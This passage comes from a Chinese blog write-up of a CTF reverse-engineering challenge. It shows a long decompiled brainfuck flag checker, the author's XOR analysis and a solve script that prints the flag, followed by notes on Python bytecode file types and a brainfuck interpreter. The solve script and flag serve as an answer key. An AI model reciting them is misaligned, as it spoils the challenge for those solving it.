class="line">    while m[p+47] :</span><br><span class="line">        m[p+48] = 0</span><br><span class="line">        m[p+47] = 2</span><br><span class="line">        while m[p+47] :</span><br><span class="line">            v = m[p+48]</span><br><span class="line">            m[p+49] = 1</span><br><span class="line">            m[p+49] = m[p+49]+v</span><br><span class="line">            m[p+47] -= 1</span><br><span class="line">            v = m[p+47]</span><br><span class="line">            m[p+48] = v</span><br><span class="line">            m[p+47] = 0</span><br><span class="line">            p += 1</span><br><span class="line">        v = m[p+2]</span><br><span class="line">        m[p+49] = v</span><br><span class="line">        m[p+50] = v</span><br><span class="line">        v = m[p+50]</span><br><span class="line">        m[p+2] = v</span><br><span class="line">        v = m[p+49]</span><br><span class="line">        m[p+47] = v</span><br><span class="line">        m[p+49] = 0</span><br><span class="line">        m[p+50] = 0</span><br><span class="line">        while m[p+48] :</span><br><span class="line">            v = m[p+47]</span><br><span class="line">            m[p+46] = m[p+46]+v</span><br><span class="line">            m[p+48] -= 1</span><br><span class="line">            v = m[p+48]</span><br><span class="line">            m[p+47] = v</span><br><span class="line">            m[p+48] = 0</span><br><span class="line">            p -= 1</span><br><span class="line">        v = m[p+47]</span><br><span class="line">        m[p+48] = 97</span><br><span class="line">        m[p+48] = m[p+48]-v</span><br><span class="line">        m[p+49] = 0</span><br><span class="line">        m[p+47] = 1</span><br><span class="line">        if m[p+48] :</span><br><span class="line">            m[p+47] -= 1</span><br><span class="line">            m[p+48] = 0</span><br><span class="line">        if m[p+47] :</span><br><span class="line">            m[p+46] += 1</span><br><span class="line">            m[p+47] = 0</span><br><span class="line">    while m[p+46] :</span><br><span class="line">        m[p+47] = 0</span><br><span class="line">        m[p+46] = 3</span><br><span class="line">        while m[p+46] :</span><br><span class="line">            v = m[p+47]</span><br><span class="line">            m[p+48] = 1</span><br><span class="line">            m[p+48] = m[p+48]+v</span><br><span class="line">            m[p+46] -= 1</span><br><span class="line">            v = m[p+46]</span><br><span class="line">            m[p+47] = v</span><br><span class="line">            m[p+46] = 0</span><br><span class="line">            p += 1</span><br><span class="line">        v = m[p+2]</span><br><span class="line">        m[p+48] = v</span><br><span class="line">        m[p+49] = v</span><br><span class="line">        v = m[p+49]</span><br><span class="line">        m[p+2] = v</span><br><span class="line">        v = m[p+48]</span><br><span class="line">        m[p+46] = v</span><br><span class="line">        m[p+48] = 0</span><br><span class="line">        m[p+49] = 0</span><br><span class="line">        while m[p+47] :</span><br><span class="line">            v = m[p+46]</span><br><span class="line">            m[p+45] = m[p+45]+v</span><br><span class="line">            m[p+47] -= 1</span><br><span class="line">            v = m[p+47]</span><br><span class="line">            m[p+46] = v</span><br><span class="line">            m[p+47] = 0</span><br><span class="line">            p -= 1</span><br><span class="line">        v = m[p+46]</span><br><span class="line">        m[p+47] = 103</span><br><span class="line">        m[p+47] = m[p+47]-v</span><br><span class="line">        m[p+48] = 0</span><br><span class="line">        m[p+46] = 1</span><br><span class="line">        if m[p+47] :</span><br><span class="line">            m[p+46] -= 1</span><br><span class="line">            m[p+47] = 0</span><br><span class="line">        if m[p+46] :</span><br><span class="line">            m[p+45] += 1</span><br><span class="line">            m[p+46] = 0</span><br><span class="line">    while m[p+45] :</span><br><span class="line">        m[p+46] = 0</span><br><span class="line">        m[p+45] = 4</span><br><span class="line">        while m[p+45] :</span><br><span class="line">            v = m[p+46]</span><br><span class="line">            m[p+47] = 1</span><br><span class="line">            m[p+47] = m[p+47]+v</span><br><span class="line">            m[p+45] -= 1</span><br><span class="line">            v = m[p+45]</span><br><span class="line">            m[p+46] = v</span><br><span class="line">            m[p+45] = 0</span><br><span class="line">            p += 1</span><br><span class="line">        v = m[p+2]</span><br><span class="line">        m[p+47] = v</span><br><span class="line">        m[p+48] = v</span><br><span class="line">        v = m[p+48]</span><br><span class="line">        m[p+2] = v</span><br><span class="line">        v = m[p+47]</span><br><span class="line">        m[p+45] = v</span><br><span class="line">        m[p+47] = 0</span><br><span class="line">        m[p+48] = 0</span><br><span class="line">        while m[p+46] :</span><br><span class="line">            v = m[p+45]</span><br><span class="line">            m[p+44] = m[p+44]+v</span><br><span class="line">            m[p+46] -= 1</span><br><span class="line">            v = m[p+46]</span><br><span class="line">            m[p+45] = v</span><br><span class="line">            m[p+46] = 0</span><br><span class="line">            p -= 1</span><br><span class="line">        v = m[p+45]</span><br><span class="line">        m[p+46] = 123</span><br><span class="line">        m[p+46] = m[p+46]-v</span><br><span class="line">        m[p+47] = 0</span><br><span class="line">        m[p+45] = 1</span><br><span class="line">        if m[p+46] :</span><br><span class="line">            m[p+45] -= 1</span><br><span class="line">            m[p+46] = 0</span><br><span class="line">        if m[p+45] :</span><br><span class="line">            m[p+44] += 1</span><br><span class="line">            m[p+45] = 0</span><br><span class="line">    while m[p+44] :</span><br><span class="line">        m[p+45] = 0</span><br><span class="line">        m[p+44] = 37</span><br><span class="line">        while m[p+44] :</span><br><span class="line">            v = m[p+45]</span><br><span class="line">            m[p+46] = 1</span><br><span class="line">            m[p+46] = m[p+46]+v</span><br><span class="line">            m[p+44] -= 1</span><br><span class="line">            v = m[p+44]</span><br><span class="line">            m[p+45] = v</span><br><span class="line">            m[p+44] = 0</span><br><span class="line">            p += 1</span><br><span class="line">        v = m[p+2]</span><br><span class="line">        m[p+46] = v</span><br><span class="line">        m[p+47] = v</span><br><span class="line">        v = m[p+47]</span><br><span class="line">        m[p+2] = v</span><br><span class="line">        v = m[p+46]</span><br><span class="line">        m[p+44] = v</span><br><span class="line">        m[p+46] = 0</span><br><span class="line">        m[p+47] = 0</span><br><span class="line">        while m[p+45] :</span><br><span class="line">            v = m[p+44]</span><br><span class="line">            m[p+43] = m[p+43]+v</span><br><span class="line">            m[p+45] -= 1</span><br><span class="line">            v = m[p+45]</span><br><span class="line">            m[p+44] = v</span><br><span class="line">            m[p+45] = 0</span><br><span class="line">            p -= 1</span><br><span class="line">        v = m[p+44]</span><br><span class="line">        m[p+45] = 125</span><br><span class="line">        m[p+45] = m[p+45]-v</span><br><span class="line">        m[p+46] = 0</span><br><span class="line">        m[p+44] = 1</span><br><span class="line">        if m[p+45] :</span><br><span class="line">            m[p+44] -= 1</span><br><span class="line">            m[p+45] = 0</span><br><span class="line">        if m[p+44] :</span><br><span class="line">            m[p+43] += 1</span><br><span class="line">            m[p+44] = 0</span><br><span class="line">    v = m[p+43]</span><br><span class="line">    m[p+44] = v</span><br><span class="line">    m[p+42] = v</span><br><span class="line">    v = m[p+44]</span><br><span class="line">    m[p+43] = v</span><br><span class="line">    v = m[p+41]</span><br><span class="line">    m[p+45] = v</span><br><span class="line">    m[p+46] = v</span><br><span class="line">    v = m[p+46]</span><br><span class="line">    m[p+41] = v</span><br><span class="line">    m[p+43] = 0</span><br><span class="line">    m[p+44] = 1</span><br><span class="line">    m[p+46] = 1</span><br><span class="line">    if m[p+45] :</span><br><span class="line">        m[p+46] -= 1</span><br><span class="line">        m[p+45] = 0</span><br><span class="line">    v = m[p+46]</span><br><span class="line">    m[p+45] = m[p+45]+v</span><br><span class="line">    m[p+46] = 0</span><br><span class="line">    if m[p+45] :</span><br><span class="line">        m[p+44] -= 1</span><br><span class="line">        m[p+43] += 1</span><br><span class="line">        m[p+45] = 0</span><br><span class="line">    while m[p+44] :</span><br><span class="line">        v = m[p+42]</span><br><span class="line">        m[p+44] = v</span><br><span class="line">        m[p+45] = v</span><br><span class="line">        v = m[p+45]</span><br><span class="line">        m[p+42] = v</span><br><span class="line">        m[p+45] = 1</span><br><span class="line">        if m[p+44] :</span><br><span class="line">            m[p+45] -= 1</span><br><span class="line">            m[p+44] = 0</span><br><span class="line">        v = m[p+45]</span><br><span class="line">        m[p+44] = m[p+44]+v</span><br><span class="line">        m[p+45] = 0</span><br><span class="line">        if m[p+44] :</span><br><span class="line">            m[p+43] += 1</span><br><span class="line">            m[p+44] = 0</span><br><span class="line">    m[p+44] = 1</span><br><span class="line">    while m[p+43] :</span><br><span class="line">        sys.stdout.write(&#x27;nonono&#x27;)</span><br><span class="line">        m[p+44] -= 1</span><br><span class="line">        m[p+45] = 111</span><br><span class="line">        m[p+46] = 0</span><br><span class="line">        m[p+43] = 0</span><br><span class="line">    while m[p+44] :</span><br><span class="line">        m[p+41] = 1</span><br><span class="line">        m[p+40] = 5</span><br><span class="line">        m[p+45] = 83</span><br><span class="line">        m[p+46] = 15</span><br><span class="line">        m[p+47] = 90</span><br><span class="line">        m[p+48] = 84</span><br><span class="line">        m[p+49] = 80</span><br><span class="line">        m[p+50] = 85</span><br><span class="line">        m[p+51] = 3</span><br><span class="line">        m[p+52] = 2</span><br><span class="line">        m[p+53] = 0</span><br><span class="line">        m[p+54] = 7</span><br><span class="line">        m[p+55] = 86</span><br><span class="line">        m[p+56] = 7</span><br><span class="line">        m[p+57] = 7</span><br><span class="line">        m[p+58] = 91</span><br><span class="line">        m[p+59] = 9</span><br><span class="line">        m[p+60] = 0</span><br><span class="line">        m[p+61] = 80</span><br><span class="line">        m[p+62] = 5</span><br><span class="line">        m[p+63] = 2</span><br><span class="line">        m[p+64] = 3</span><br><span class="line">        m[p+65] = 93</span><br><span class="line">        m[p+66] = 92</span><br><span class="line">        m[p+67] = 80</span><br><span class="line">        m[p+68] = 81</span><br><span class="line">        m[p+69] = 82</span><br><span class="line">        m[p+70] = 84</span><br><span class="line">        m[p+71] = 90</span><br><span class="line">        m[p+72] = 95</span><br><span class="line">        m[p+73] = 2</span><br><span class="line">        m[p+74] = 87</span><br><span class="line">        m[p+75] = 7</span><br><span class="line">        m[p+76] = 52</span><br><span class="line">        m[p+77] = 5</span><br><span class="line">        m[p+78] = 36</span><br><span class="line">        m[p+79] = 0</span><br><span class="line">        m[p+80] = 0</span><br><span class="line">        while m[p+78] :</span><br><span class="line">            v = m[p+77]</span><br><span class="line">            m[p+79] = v</span><br><span class="line">            m[p+80] = m[p+80]+v</span><br><span class="line">            v = m[p+79]</span><br><span class="line">            m[p+77] = v</span><br><span class="line">            m[p+79] = 1</span><br><span class="line">            if m[p+80] :</span><br><span class="line">                m[p+79] -= 1</span><br><span class="line">                m[p+77] -= 1</span><br><span class="line">                m[p+80] = 0</span><br><span class="line">            m[p+78] -= 1</span><br><span class="line">        v = m[p+79]</span><br><span class="line">        m[p+77] = v</span><br><span class="line">        m[p+79] = 0</span><br><span class="line">        while m[p+77] :</span><br><span class="line">            v = m[p+40]</span><br><span class="line">            m[p+77] = v</span><br><span class="line">            m[p+78] = v</span><br><span class="line">            v = m[p+78]</span><br><span class="line">            m[p+40] = v</span><br><span class="line">            v = m[p+40]</span><br><span class="line">            m[p+79] = v</span><br><span class="line">            m[p+80] = v</span><br><span class="line">            v = m[p+80]</span><br><span class="line">            m[p+40] = v</span><br><span class="line">            m[p+78] = 0</span><br><span class="line">            m[p+80] = 0</span><br><span class="line">            while m[p+79] :</span><br><span class="line">                v = m[p+80]</span><br><span class="line">                m[p+81] = 1</span><br><span class="line">                m[p+81] = m[p+81]+v</span><br><span class="line">                m[p+79] -= 1</span><br><span class="line">                v = m[p+79]</span><br><span class="line">                m[p+80] = v</span><br><span class="line">                m[p+79] = 0</span><br><span class="line">                p += 1</span><br><span class="line">            v = m[p+2]</span><br><span class="line">            m[p+81] = v</span><br><span class="line">            m[p+82] = v</span><br><span class="line">            v = m[p+82]</span><br><span class="line">            m[p+2] = v</span><br><span class="line">            v = m[p+81]</span><br><span class="line">            m[p+79] = v</span><br><span class="line">            m[p+81] = 0</span><br><span class="line">            m[p+82] = 0</span><br><span class="line">            while m[p+80] :</span><br><span class="line">                v = m[p+79]</span><br><span class="line">                m[p+78] = m[p+78]+v</span><br><span class="line">                m[p+80] -= 1</span><br><span class="line">                v = m[p+80]</span><br><span class="line">                m[p+79] = v</span><br><span class="line">                m[p+80] = 0</span><br><span class="line">                p -= 1</span><br><span class="line">            v = m[p+40]</span><br><span class="line">            m[p+80] = v</span><br><span class="line">            m[p+81] = v</span><br><span class="line">            v = m[p+81]</span><br><span class="line">            m[p+40] = v</span><br><span class="line">            m[p+80] += 1</span><br><span class="line">            m[p+81] = 0</span><br><span class="line">            while m[p+80] :</span><br><span class="line">                v = m[p+81]</span><br><span class="line">                m[p+82] = 1</span><br><span class="line">                m[p+82] = m[p+82]+v</span><br><span class="line">                m[p+80] -= 1</span><br><span class="line">                v = m[p+80]</span><br><span class="line">                m[p+81] = v</span><br><span class="line">                m[p+80] = 0</span><br><span class="line">                p += 1</span><br><span class="line">            v = m[p+2]</span><br><span class="line">            m[p+82] = v</span><br><span class="line">            m[p+83] = v</span><br><span class="line">            v = m[p+83]</span><br><span class="line">            m[p+2] = v</span><br><span class="line">            v = m[p+82]</span><br><span class="line">            m[p+80] = v</span><br><span class="line">            m[p+82] = 0</span><br><span class="line">            m[p+83] = 0</span><br><span class="line">            while m[p+81] :</span><br><span class="line">                v = m[p+80]</span><br><span class="line">                m[p+79] = m[p+79]+v</span><br><span class="line">                m[p+81] -= 1</span><br><span class="line">                v = m[p+81]</span><br><span class="line">                m[p+80] = v</span><br><span class="line">                m[p+81] = 0</span><br><span class="line">                p -= 1</span><br><span class="line">            m[p+86] = 0</span><br><span class="line">            m[p+87] = -8</span><br><span class="line">            m[p+88] = 0</span><br><span class="line">            while m[p+87] :</span><br><span class="line">                m[p+87] += 8</span><br><span class="line">                m[p+85] = 0</span><br><span class="line">                m[p+84] = 0</span><br><span class="line">                m[p+83] = 0</span><br><span class="line">                m[p+82] = 0</span><br><span class="line">                m[p+81] = 2</span><br><span class="line">                while m[p+79] :</span><br><span class="line">                    m[p+81] -= 1</span><br><span class="line">                    v = m[p+81]</span><br><span class="line">                    m[p+82] = m[p+82]+v</span><br><span class="line">                    m[p+84] = m[p+84]+v</span><br><span class="line">                    v = m[p+82]</span><br><span class="line">                    m[p+81] = v</span><br><span class="line">                    m[p+84] -= 1</span><br><span class="line">                    v = m[p+84]</span><br><span class="line">                    m[p+83] = m[p+83]-v</span><br><span class="line">                    m[p+81] = m[p+81]-v*2</span><br><span class="line">                    m[p+86] += 1</span><br><span class="line">                    m[p+86] = m[p+86]+v*2</span><br><span class="line">                    m[p+84] = 0</span><br><span class="line">                    m[p+82] = 0</span><br><span class="line">                    m[p+79] -= 1</span><br><span class="line">                v = m[p+83]</span><br><span class="line">                m[p+79] = v</span><br><span class="line">                m[p+81] = 2</span><br><span class="line">                m[p+83] = 0</span><br><span class="line">                while m[p+80] :</span><br><span class="line">                    m[p+81] -= 1</span><br><span class="line">                    v = m[p+81]</span><br><span class="line">                    m[p+82] = m[p+82]+v</span><br><span class="line">                    m[p+84] = m[p+84]+v</span><br><span class="line">                    v = m[p+82]</span><br><span class="line">                    m[p+81] = v</span><br><span class="line">                    m[p+84] -= 1</span><br><span class="line">                    v = m[p+84]</span><br><span class="line">                    m[p+85] += 1</span><br><span class="line">                    m[p+85] = m[p+85]+v*2</span><br><span class="line">                    m[p+83] = m[p+83]-v</span><br><span class="line">                    m[p+81] = m[p+81]-v*2</span><br><span class="line">                    m[p+82] = 0</span><br><span class="line">                    m[p+84] = 0</span><br><span class="line">                    m[p+80] -= 1</span><br><span class="line">                v = m[p+83]</span><br><span class="line">                m[p+80] = v</span><br><span class="line">                v = m[p+85]</span><br><span class="line">                m[p+86] = m[p+86]-v</span><br><span class="line">                m[p+85] = 0</span><br><span class="line">                m[p+83] = 0</span><br><span class="line">                if m[p+86] :</span><br><span class="line">                    m[p+84] += 1</span><br><span class="line">                    m[p+86] = 0</span><br><span class="line">                v = m[p+87]</span><br><span class="line">                m[p+86] = m[p+86]+v</span><br><span class="line">                m[p+85] = m[p+85]+v</span><br><span class="line">                v = m[p+86]</span><br><span class="line">                m[p+87] = v</span><br><span class="line">                m[p+86] = 0</span><br><span class="line">                while m[p+85] :</span><br><span class="line">                    v = m[p+84]</span><br><span class="line">                    m[p+83] = m[p+83]+v</span><br><span class="line">                    v = m[p+83]</span><br><span class="line">                    m[p+84] = v*2</span><br><span class="line">                    m[p+83] = 0</span><br><span class="line">                    m[p+85] -= 1</span><br><span class="line">                v = m[p+84]</span><br><span class="line">                m[p+88] = m[p+88]+v</span><br><span class="line">                m[p+87] -= 7</span><br><span class="line">                m[p+84] = 0</span><br><span class="line">            v = m[p+88]</span><br><span class="line">            m[p+79] = m[p+79]+v</span><br><span class="line">            m[p+88] = 0</span><br><span class="line">            while m[p+77] :</span><br><span class="line">                v = m[p+79]</span><br><span class="line">                m[p+80] = v</span><br><span class="line">                m[p+78] += 1</span><br><span class="line">                v = m[p+78]</span><br><span class="line">                m[p+79] = v</span><br><span class="line">                m[p+77] -= 1</span><br><span class="line">                v = m[p+77]</span><br><span class="line">                m[p+78] = v</span><br><span class="line">                m[p+77] = 0</span><br><span class="line">                p += 1</span><br><span class="line">            v = m[p+79]</span><br><span class="line">            m[p+80] = v</span><br><span class="line">            m[p+2] = v</span><br><span class="line">            v = m[p+80]</span><br><span class="line">            m[p+79] = v</span><br><span class="line">            v = m[p+79]</span><br><span class="line">            m[p+77] = v</span><br><span class="line">            m[p+79] = 0</span><br><span class="line">            m[p+80] = 0</span><br><span class="line">            while m[p+78] :</span><br><span class="line">                v = m[p+77]</span><br><span class="line">                m[p+76] = m[p+76]+v</span><br><span class="line">                m[p+78] -= 1</span><br><span class="line">                v = m[p+78]</span><br><span class="line">                m[p+77] = v</span><br><span class="line">                m[p+78] = 0</span><br><span class="line">                p -= 1</span><br><span class="line">            v = m[p+40]</span><br><span class="line">            m[p+77] = v</span><br><span class="line">            m[p+78] = v</span><br><span class="line">            m[p+78] += 1</span><br><span class="line">            v = m[p+78]</span><br><span class="line">            m[p+40] = v</span><br><span class="line">            v = m[p+40]</span><br><span class="line">            m[p+77] = v</span><br><span class="line">            m[p+78] = v</span><br><span class="line">            v = m[p+78]</span><br><span class="line">            m[p+40] = v</span><br><span class="line">            m[p+78] = 36</span><br><span class="line">            m[p+79] = 0</span><br><span class="line">            m[p+80] = 0</span><br><span class="line">            while m[p+78] :</span><br><span class="line">                v = m[p+77]</span><br><span class="line">                m[p+79] = v</span><br><span class="line">                m[p+80] = m[p+80]+v</span><br><span class="line">                v = m[p+79]</span><br><span class="line">                m[p+77] = v</span><br><span class="line">                m[p+79] = 1</span><br><span class="line">                if m[p+80] :</span><br><span class="line">                    m[p+79] -= 1</span><br><span class="line">                    m[p+77] -= 1</span><br><span class="line">                    m[p+80] = 0</span><br><span class="line">                m[p+78] -= 1</span><br><span class="line">            v = m[p+79]</span><br><span class="line">            m[p+77] = v</span><br><span class="line">            m[p+79] = 0</span><br><span class="line">        m[p+40] = 0</span><br><span class="line">        m[p+78] = 32</span><br><span class="line">        m[p+79] = 0</span><br><span class="line">        m[p+80] = 0</span><br><span class="line">        while m[p+78] :</span><br><span class="line">            v = m[p+77]</span><br><span class="line">            m[p+79] = v</span><br><span class="line">            m[p+80] = m[p+80]+v</span><br><span class="line">            v = m[p+79]</span><br><span class="line">            m[p+77] = v</span><br><span class="line">            m[p+79] = 1</span><br><span class="line">            if m[p+80] :</span><br><span class="line">                m[p+79] -= 1</span><br><span class="line">                m[p+77] -= 1</span><br><span class="line">                m[p+80] = 0</span><br><span class="line">            m[p+78] -= 1</span><br><span class="line">        v = m[p+79]</span><br><span class="line">        m[p+77] = v</span><br><span class="line">        m[p+79] = 0</span><br><span class="line">        while m[p+77] :</span><br><span class="line">            v = m[p+40]</span><br><span class="line">            m[p+78] = v</span><br><span class="line">            m[p+79] = v</span><br><span class="line">            v = m[p+79]</span><br><span class="line">            m[p+40] = v</span><br><span class="line">            v = m[p+78]</span><br><span class="line">            m[p+77] = 5</span><br><span class="line">            m[p+77] = m[p+77]+v</span><br><span class="line">            m[p+78] = 0</span><br><span class="line">            m[p+79] = 0</span><br><span class="line">            while m[p+77] :</span><br><span class="line">                v = m[p+78]</span><br><span class="line">                m[p+79] = 1</span><br><span class="line">                m[p+79] = m[p+79]+v</span><br><span class="line">                m[p+77] -= 1</span><br><span class="line">                v = m[p+77]</span><br><span class="line">                m[p+78] = v</span><br><span class="line">                m[p+77] = 0</span><br><span class="line">                p += 1</span><br><span class="line">            v = m[p+2]</span><br><span class="line">            m[p+79] = v</span><br><span class="line">            m[p+80] = v</span><br><span class="line">            v = m[p+80]</span><br><span class="line">            m[p+2] = v</span><br><span class="line">            v = m[p+79]</span><br><span class="line">            m[p+77] = v</span><br><span class="line">            m[p+79] = 0</span><br><span class="line">            m[p+80] = 0</span><br><span class="line">            while m[p+78] :</span><br><span class="line">                v = m[p+77]</span><br><span class="line">                m[p+76] = m[p+76]+v</span><br><span class="line">                m[p+78] -= 1</span><br><span class="line">                v = m[p+78]</span><br><span class="line">                m[p+77] = v</span><br><span class="line">                m[p+78] = 0</span><br><span class="line">                p -= 1</span><br><span class="line">            v = m[p+40]</span><br><span class="line">            m[p+78] = v</span><br><span class="line">            m[p+79] = v</span><br><span class="line">            v = m[p+79]</span><br><span class="line">            m[p+40] = v</span><br><span class="line">            m[p+79] = 0</span><br><span class="line">            while m[p+78] :</span><br><span class="line">                v = m[p+79]</span><br><span class="line">                m[p+80] = 1</span><br><span class="line">                m[p+80] = m[p+80]+v</span><br><span class="line">                m[p+78] -= 1</span><br><span class="line">                v = m[p+78]</span><br><span class="line">                m[p+79] = v</span><br><span class="line">                m[p+78] = 0</span><br><span class="line">                p += 1</span><br><span class="line">            v = m[p+45]</span><br><span class="line">            m[p+80] = v</span><br><span class="line">            m[p+81] = v</span><br><span class="line">            v = m[p+81]</span><br><span class="line">            m[p+45] = v</span><br><span class="line">            v = m[p+80]</span><br><span class="line">            m[p+78] = v</span><br><span class="line">            m[p+80] = 0</span><br><span class="line">            m[p+81] = 0</span><br><span class="line">            while m[p+79] :</span><br><span class="line">                v = m[p+78]</span><br><span class="line">                m[p+77] = m[p+77]+v</span><br><span class="line">                m[p+79] -= 1</span><br><span class="line">                v = m[p+79]</span><br><span class="line">                m[p+78] = v</span><br><span class="line">                m[p+79] = 0</span><br><span class="line">                p -= 1</span><br><span class="line">            v = m[p+77]</span><br><span class="line">            m[p+78] = m[p+78]-v</span><br><span class="line">            m[p+77] = 0</span><br><span class="line">            if m[p+78] :</span><br><span class="line">                m[p+77] += 1</span><br><span class="line">                m[p+78] = 0</span><br><span class="line">            while m[p+77] :</span><br><span class="line">                m[p+79] = 0</span><br><span class="line">                m[p+80] = 0</span><br><span class="line">                m[p+41] = 0</span><br><span class="line">                m[p+77] = 0</span><br><span class="line">            v = m[p+40]</span><br><span class="line">            m[p+77] = v</span><br><span class="line">            m[p+78] = v</span><br><span class="line">            m[p+78] += 1</span><br><span class="line">            v = m[p+78]</span><br><span class="line">            m[p+40] = v</span><br><span class="line">            v = m[p+40]</span><br><span class="line">            m[p+77] = v</span><br><span class="line">            m[p+78] = v</span><br><span class="line">            v = m[p+78]</span><br><span class="line">            m[p+40] = v</span><br><span class="line">            m[p+78] = 32</span><br><span class="line">            m[p+79] = 0</span><br><span class="line">            m[p+80] = 0</span><br><span class="line">            while m[p+78] :</span><br><span class="line">                v = m[p+77]</span><br><span class="line">                m[p+79] = v</span><br><span class="line">                m[p+80] = m[p+80]+v</span><br><span class="line">                v = m[p+79]</span><br><span class="line">                m[p+77] = v</span><br><span class="line">                m[p+79] = 1</span><br><span class="line">                if m[p+80] :</span><br><span class="line">                    m[p+79] -= 1</span><br><span class="line">                    m[p+77] -= 1</span><br><span class="line">                    m[p+80] = 0</span><br><span class="line">                m[p+78] -= 1</span><br><span class="line">            v = m[p+79]</span><br><span class="line">            m[p+77] = v</span><br><span class="line">            m[p+79] = 0</span><br><span class="line">        v = m[p+41]</span><br><span class="line">        m[p+77] = v</span><br><span class="line">        m[p+78] = v</span><br><span class="line">        v = m[p+78]</span><br><span class="line">        m[p+41] = v</span><br><span class="line">        m[p+78] = 1</span><br><span class="line">        while m[p+77] :</span><br><span class="line">            sys.stdout.write(&#x27;Congrats!&#x27;)</span><br><span class="line">            m[p+78] -= 1</span><br><span class="line">            m[p+79] = 33</span><br><span class="line">            m[p+80] = 0</span><br><span class="line">            m[p+77] = 0</span><br><span class="line">        while m[p+78] :</span><br><span class="line">            sys.stdout.write(&#x27;nonono&#x27;)</span><br><span class="line">            m[p+79] = 111</span><br><span class="line">            m[p+80] = 0</span><br><span class="line">            m[p+78] -= 1</span><br><span class="line">        m[p+44] -= 1</span><br><span class="line">    return 0</span><br><span class="line"></span><br><span class="line">brainfuck(None)</span><br></pre></td></tr></table></figure>
<p> &emsp;一点点调试分析（漫长的过程，需要有耐心）。分析得到的结论<strong>（花了5 days）</strong>：</p>
<ol>
<li>前5个字符为<code>flag&#123;</code>，字符串总长度为38，最后一个字符为<code>&#125;</code>。</li>
<li><code>flag&#123;&#125;</code>中最后一个字符为4。</li>
<li><p><code>flag&#123;&#125;</code>中的字符，满足：<code>flag[i]^flag[i+1]==arr[i]</code>，且<code>arr=[83,15,90,84,80,85,3,2,0,7,86,7,7,91,9,0,80,5,2,3,93,92,80,81,82,84,90,95,2,87,7,52]</code>。</p>
<p>&emsp;最后上脚本：</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># @Time  : 2023/01/01 20:59:31</span><br><span class="line"># @Author: wd-2711</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    arr = [83,15,90,84,80,85,3,2,0,7,86,7,7,91,9,0,80,5,2,3,93,92,80,81,82,84,90,95,2,87,7,52]</span><br><span class="line">    nowChar = chr(arr[-1])</span><br><span class="line">    ans = chr(arr[-1])</span><br><span class="line">    for a in arr[:-1][::-1]:</span><br><span class="line">        for i in range(256):</span><br><span class="line">            if ord(nowChar)^i == a:</span><br><span class="line">                nowChar = chr(i)</span><br><span class="line">                ans += nowChar</span><br><span class="line">                break</span><br><span class="line">    print(&quot;flag&#123;&quot;+ans[:32][::-1]+&quot;&#125;&quot;)</span><br><span class="line"># flag&#123;d78b6f30225cdc811adfe8d4e7c9fd34&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p><strong>知识点1：</strong>py，pyc，pyo，pyd之间的关系</p>
<p><img src="/images/re-part-5/image-20221227153429032-167980209732323.png" alt="image-20221227153429032"></p>
<p><strong>知识点2：</strong>brainfuck语言。</p>
<p> &emsp;8种指令字符，图灵完备的编程语言。Brainfuck包括1个字节为单位、且初始值为0的数组，一个指向该数组的指针，用于输入输出的字节流。</p>
<p><img src="/images/re-part-5/image-20221228133435556-167980209732325.png" alt="image-20221228133435556"></p>
<p>&emsp; 注意，在对数组的字节进行加减时有两种特殊的规则：（1）0−1=255。（2）255+1=0。</p>
<p> &emsp;以下是brainfuck的一个解释器，并实现了helloworld，挺有意思：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"># Python 实现的 Brainfuck 解释器</span><br><span class="line"></span><br><span class="line">test = &#x27;++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.&#x27;</span><br><span class="line"># test1 = &#x27;,----------[----------------------.,----------]&#x27;</span><br><span class="line"></span><br><span class="line">def bf_interpreter(bf_code):</span><br><span class="line">    main_list = [0]</span><br><span class="line">    now_id = 0</span><br><span class="line">    now_position = 0</span><br><span class="line">    while now_position &lt; len(bf_code):</span><br><span class="line">        </span><br><span class="line">        command = bf_code[now_position]</span><br><span class="line">        print(main_list, now_id)</span><br><span class="line">        if command == &#x27;&lt;&#x27;:</span><br><span class="line">            if now_id == 0:</span><br><span class="line">                print_error(1, &#x27;内存错误，指针位于-1&#x27;)</span><br><span 